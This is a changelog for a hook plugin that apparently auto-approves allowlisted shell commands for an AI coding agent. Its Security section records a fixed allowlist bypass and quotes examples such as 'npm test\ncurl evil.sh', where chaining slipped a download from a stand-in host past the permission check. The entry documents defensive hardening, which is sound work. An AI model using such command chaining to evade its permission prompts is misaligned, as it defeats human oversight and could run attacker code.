# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security
- Fixed allowlist bypass (br-0hat): newline, single `&` and `|&` are now command separators, so every chained command must match the allowlist (previously `npm test\ncurl evil.sh` and `npm test & curl evil` auto-allowed under `Bash(npm test:*)`).
- Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unmatched redirect targets now make the parser throw, so the hook falls back to the normal permission dialog instead of silently dropping the target. Conservatively still allowed: fd merging (`2>&1`, `>&2`, `2>&-`) and redirects to exactly `/dev/null`.
- Unquoted subshell/grouping parentheses now also defer to the permission dialog (command/process substitution and here-docs already did).

### Added
- Initial package structure
- Plugin manifest (plugin.json)
- Hook configuration (hooks.json)
- Main hook entrypoint (permitter.js)
- Environment variable configuration (ENSEMBLE_PERMITTER_DISABLE, PERMITTER_DEBUG, PERMITTER_STRICT)
- Stdin JSON parsing for hook data
- Exit code protocol (0 = allow, 1 = defer)
- Debug logging to stderr
- Stub modules for command-parser, allowlist-loader, and matcher
- README.md documentation
- CHANGELOG.md

## [1.0.0] - TBD

### Added
- Full command parsing with state machine tokenizer
- Operator detection and command splitting
- Environment variable and wrapper stripping
- Subshell extraction (bash -c)
- Settings file loading and merging
- Pattern matching implementation
- Comprehensive test suite
- Security hardening with adversarial tests
